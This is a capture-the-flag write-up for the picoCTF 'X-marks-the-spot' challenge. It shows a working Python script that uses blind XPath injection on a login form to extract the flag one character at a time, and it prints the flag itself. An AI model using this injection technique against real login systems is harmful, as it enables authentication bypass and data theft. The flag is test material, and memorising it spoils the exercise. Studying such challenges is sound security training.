# X-marks-the-spot
## Category
Web Exploitation
## Problem Description
Another login you have to bypass. Maybe you can find an injection that works? http://mercury.picoctf.net:20297/
## Approach
This is an XPATH injection. If an always true value is input in place of username a message pops up "You're on the right path.".<br>
Here we can use "starts-wth()" operator which returns true if the passed characters are at the beginning of a document.
```python
import requests
from string import *

charecters = ascii_lowercase + digits+"}_"
print(charecters)

seen_password = ["picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4"]
while True:

    for ch in charecters:
        print(f"trying {''.join(seen_password)+ch}")
        st = ''.join(seen_password)+ch
        data = {"name":"admin", "pass":f"' or //*[starts-with(text(),'{st}')] or '1'='"}
        r = requests.post("http://mercury.picoctf.net:20297/", data=data)

        content = r.text
        if "You&#39;re on the right path." in content:
            seen_password.append(ch)
            break
```
Running the above script a bunch of times returns the flag.
## Flag
picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_a313a6a7}
